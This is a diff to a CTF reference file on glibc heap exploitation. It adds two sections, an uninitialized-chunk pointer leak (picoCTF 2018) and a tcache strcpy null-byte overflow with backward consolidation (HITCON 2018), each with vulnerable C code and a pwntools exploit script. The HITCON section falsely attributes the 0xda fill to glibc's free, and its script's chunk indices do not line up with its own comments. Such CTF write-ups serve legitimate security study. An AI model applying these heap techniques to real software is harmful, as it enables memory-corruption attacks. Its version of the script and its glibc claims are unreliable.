@@ -1,22 +1,24 @@
 # CTF Pwn - Heap Techniques
 
 ## Table of Contents
-- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2-fsop-for-glibc-234-0xfun-2026)
+- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2--fsop-for-glibc-234-0xfun-2026)
   - [setcontext Variant for SUID Binaries (Midnight Flag 2026)](#setcontext-variant-for-suid-binaries-midnight-flag-2026)
-- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar-off-by-one-null-byte-0xfun-2026)
+- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
 - [Heap Exploitation](#heap-exploitation)
   - [Heap Grooming via Application Operations (Codegate 2013)](#heap-grooming-via-application-operations-codegate-2013)
 - [Custom Allocator Exploitation](#custom-allocator-exploitation)
   - [talloc Pool Header Forgery for Arbitrary Read/Write (Boston Key Party 2016)](#talloc-pool-header-forgery-for-arbitrary-readwrite-boston-key-party-2016)
 - [Classic Heap Unlink Attack (Crypto-Cat)](#classic-heap-unlink-attack-crypto-cat)
-- [musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)](#musl-libc-heap-exploitation-meta-pointer-atexit-unbreakable-2026)
+- [musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)](#musl-libc-heap-exploitation--meta-pointer--atexit-unbreakable-2026)
 - [House of Orange](#house-of-orange)
 - [House of Spirit](#house-of-spirit)
 - [House of Lore](#house-of-lore)
 - [House of Force (CSAW CTF 2016)](#house-of-force-csaw-ctf-2016)
 - [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
-- [Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)](#unsafe-unlink-to-bss-top-chunk-consolidation-seccon-2016)
+- [Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)](#unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016)
 - [UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)](#uaf-vtable-pointer-encoding-shell-argument-bctf-2017)
+- [Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)](#uninitialized-chunk-residue-pointer-leak-picoctf-2018)
+- [tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)](#tcache-strcpy-null-byte-overflow--backward-consolidation-hitcon-2018)
 
 For FILE-structure (_IO_FILE) exploitation — fastbin stdout vtable hijack, _IO_buf_base null-byte overwrite, glibc 2.24+ vtable validation bypass, unsorted-bin attacks on stdin FILE fields, realloc-as-free UAF, and refcount wraparound — see [heap-fsop.md](heap-fsop.md).
 
@@ -543,3 +545,94 @@ trigger_vtable_call(target_obj)  # calls system("sh")
 **References:** BCTF 2017
 
 See [heap-fsop.md](heap-fsop.md) for FILE-structure (_IO_FILE) exploitation: fastbin stdout vtable hijack, _IO_buf_base null-byte overwrite, glibc 2.24+ vtable validation bypass, unsorted-bin attacks on stdin FILE fields, and related UAF/refcount bugs.
+
+---
+
+## Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)
+
+**Pattern:** A contact manager allocates a struct `{name, bio}` on the heap but only writes `name`, leaving `bio` uninitialized. After a delete-then-create cycle the new allocation reuses a chunk that still holds a stale pointer from a previous contact. The application's `print_contact()` dereferences `bio`, turning the leftover allocator residue into a controlled heap/libc read.
+
+```c
+struct contact { char *name; char *bio; };    // bio never zeroed
+
+void create() {
+    struct contact *c = malloc(sizeof *c);
+    c->name = malloc(NAME_SZ);
+    read_line(c->name, NAME_SZ);
+    // bio left uninitialized!
+}
+
+void print(struct contact *c) { puts(c->bio); }   // leaks stale pointer target
+```
+
+```python
+from pwn import *
+io = process("./contacts")
+
+# 1. Prime the heap: create a contact whose name chunk will later be reused
+#    as the struct for the next contact.
+io.sendline("create");  io.sendline("A" * 0x18)
+io.sendline("delete 0")
+
+# 2. Create a new contact — it grabs the previously freed chunk. The old
+#    name bytes now live in the struct's `bio` field.
+io.sendline("create");  io.sendline("B" * 0x10)
+
+# 3. Print → leaks the residue as if it were a bio string.
+io.sendline("print 0")
+leak = u64(io.recvline().ljust(8, b"\x00"))
+log.success(f"heap leak: {leak:#x}")
+```
+
+**Key insight:** Uninitialized fields are write-what-where primitives in reverse — the attacker does not choose *what* the field holds but can *place* chunks so that useful bytes end up in it. Target any struct field that is (a) read later without being written and (b) subject to chunk reuse. Common culprits: manually-written `malloc` + `read_line` pairs, C++ classes with members that skip initialisation in non-default constructors, and zero-allocated-then-partially-written caches.
+
+**References:** picoCTF 2018 — Contacts, writeup 11585
+
+---
+
+## tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)
+
+**Pattern:** `strcpy(dst, user_name)` appends a trailing NUL that falls one byte past the allocated chunk, clearing `PREV_INUSE` on the next chunk's size field. With a forged `prev_size`, `free()` triggers backward consolidation across a tcache-resident chunk, producing two overlapping heap regions. Splitting out a remainder chunk keeps main_arena pointers in the `fd`/`bk` of one of the overlapping allocations, giving an unsorted-bin-style libc leak in the tcache era.
+
+```c
+// Allocation pattern (glibc 2.27 tcache)
+char *a = malloc(0xF8);            // victim 1
+char *b = malloc(0x18);            // small header chunk with PREV_INUSE
+strcpy(a, payload);                // 0xF8 bytes + '\0' overflows into b->size
+```
+
+```python
+from pwn import *
+
+io = process("./children_tcache")
+libc = ELF("./libc-2.27.so")
+
+# 1. Zero the 0xda memset residue with repeated smaller allocations.
+for size in (0x70, 0x60, 0x50, 0x40):
+    io.sendline("add"); io.sendline(str(size)); io.sendline(b"\x00" * size)
+
+# 2. Set up two adjacent chunks:
+io.sendline("add"); io.sendline("0xF8"); io.sendline(b"A" * 0xF8)     # victim 1
+io.sendline("add"); io.sendline("0x18"); io.sendline(b"B" * 0x18)     # header
+
+# 3. Free victim 1 into the smallbin (needs a > 0x408 sibling to bypass tcache).
+io.sendline("add"); io.sendline("0x420"); io.sendline(b"X" * 0x420)
+io.sendline("del 0")                         # smallbin → keeps libc fd/bk
+
+# 4. Overflow via strcpy: clears PREV_INUSE, forges prev_size → backward consolidate
+overflow = b"A" * 0xF0 + p64(0x100)           # fake prev_size
+io.sendline("edit 1"); io.sendline(overflow)
+io.sendline("del 1")                         # consolidate: now we overlap
+
+# 5. Re-allocate the coalesced region and read the libc pointer that still
+#    lives in the old fd/bk location.
+io.sendline("add"); io.sendline("0x110"); io.sendline(b"P" * 0x10)
+io.sendline("show 0")
+leak = u64(io.recvline().strip().ljust(8, b"\x00"))
+libc.address = leak - (libc.symbols["main_arena"] + 0x60)
+log.success(f"libc base {libc.address:#x}")
+```
+
+**Key insight:** tcache bypasses most pre-2.27 consolidation tricks, but the `strcpy` null-byte overflow remains viable because it acts on the *next chunk's header*, not the current chunk's in-use flag. Combined with careful zeroing of glibc 2.26+ memset residue (the `0xda` pattern glibc uses on free), you can re-use classic off-by-one-null techniques even in a tcache world. The magic sizes are: large enough to skip the tcache (>0x408 for the freed chunk), small enough to land next to the overflow target.
+
+**References:** HITCON CTF 2018 — Children Tcache, writeup 11929
